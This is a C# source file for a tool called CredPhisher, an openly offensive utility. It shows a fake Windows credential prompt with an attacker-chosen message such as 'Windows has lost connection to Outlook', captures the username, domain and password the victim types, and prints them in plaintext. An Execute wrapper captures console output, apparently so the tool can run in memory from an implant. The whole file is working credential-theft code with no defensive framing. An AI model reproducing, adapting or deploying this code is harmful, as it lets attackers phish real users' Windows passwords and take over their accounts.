using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

namespace CredPhisher
{
    class MainClass
    {
        [DllImport("ole32.dll")]
        public static extern void CoTaskMemFree(IntPtr ptr);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
            IntPtr pAuthBuffer,
            uint cbAuthBuffer,
            StringBuilder pszUserName,
            ref int pcchMaxUserName,
            StringBuilder pszDomainName,
            ref int pcchMaxDomainame,
            StringBuilder pszPassword,
            ref int pcchMaxPassword);

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
            int authError,
            ref uint authPackage,
            IntPtr InAuthBuffer,
            uint InAuthBufferSize,
            out IntPtr refOutAuthBuffer,
            out uint refOutAuthBufferSize,
            ref bool fSave,
            int flags);

        public static void Collector(string message, out NetworkCredential networkCredential)
        {
            CREDUI_INFO credui = new CREDUI_INFO();
            //This block collects the current username and prompts them. This is easily modifiable.
            string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            credui.pszCaptionText = message;
            credui.pszMessageText = "Please enter the credentials for " + username;
            credui.cbSize = Marshal.SizeOf(credui);
            uint authPackage = 0;
            IntPtr outCredBuffer = new IntPtr();
            uint outCredSize;
            bool save = false;
            int result = CredUIPromptForWindowsCredentials(ref credui,
                0,
                ref authPackage,
                IntPtr.Zero,
                0,
                out outCredBuffer,
                out outCredSize,
                ref save,
                1);

            var usernameBuf = new StringBuilder(256);
            var passwordBuf = new StringBuilder(256);
            var domainBuf = new StringBuilder(128);

            int maxUserName = 256;
            int maxDomain = 256;
            int maxPassword = 128;
            if (result == 0)
            {
                if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
                    domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
                {
                    CoTaskMemFree(outCredBuffer);
                    networkCredential = new NetworkCredential()
                    {
                        UserName = usernameBuf.ToString(),
                        Password = passwordBuf.ToString(),
                        Domain = domainBuf.ToString()
                    };
                    return;
                }
            }
            networkCredential = null;
        }

[DllImport("shell32.dll", SetLastError = true)]
static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

public static string[] CommandLineToArgs(string commandLine)
{
    int argc;
    var argv = CommandLineToArgvW(commandLine, out argc);
    if (argv == IntPtr.Zero)
        throw new System.ComponentModel.Win32Exception();
    try
    {
        var args = new string[argc];
        for (var i = 0; i < args.Length; i++)
        {
            var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
            args[i] = Marshal.PtrToStringUni(p);
        }

        return args;
    }
    finally
    {
        Marshal.FreeHGlobal(argv);
    }
}

public static string Execute(string commandLine)
{
    var sw = new StringWriter();
    Console.SetOut(sw);
    Console.SetError(sw);

    try
    {
        Main(CommandLineToArgs(commandLine));
    }
    catch (Exception e)
    {
        return e.ToString();
    }

    return sw.ToString();
}

        static void Main(string[] args)
        {
            if (args.Length == 0){
                Console.WriteLine("[-] Please supply the message that will be displayed to the target (ex. 'Windows has lost connection to Outlook')");
                return;
            }
            try
            {
                Collector(args[0], out NetworkCredential networkCredential);
                Console.WriteLine("[+] Collected Credentials:\r\n" +
                    "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
                    "Password: " + networkCredential.Password);
            }
            catch (NullReferenceException) 
            {
                Console.WriteLine("[-] User exited prompt");
            }
            catch (Exception)
            {
                Console.WriteLine("[-] Looks like something went wrong...");
            }
            
        }
    }
}
